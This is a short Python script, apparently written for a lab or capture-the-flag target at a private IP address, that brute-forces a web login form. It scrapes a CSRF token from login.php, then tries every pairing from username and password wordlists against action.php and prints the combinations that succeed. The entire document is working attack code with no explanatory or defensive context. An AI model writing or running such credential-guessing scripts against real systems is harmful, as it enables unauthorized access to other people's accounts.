import requests
from bs4 import BeautifulSoup

S = requests.Session()

responce = S.get('http://192.168.228.235/login.php')
soup_search = BeautifulSoup(responce.text, 'html.parser')

csrf = soup_search.select_one('input[name="CSRF_PROTECTION"]')['value']

users = []
passwds = []

with open('usernames.txt', 'r') as file:
        users = file.readlines()

with open('passwords.txt', 'r') as file:
        passwds = file.readlines()


for user in users:
        for passwd in passwds:
                post = {'username':user.replace("\n", ""), 'password':passwd.replace("\n", ""), 'CSRF_PROTECTION':csrf}
                resp2 = S.post('http://192.168.228.235/action.php', data=post)
                if "again" not in resp2.text:
                        print(f"{user}: {passwd}")
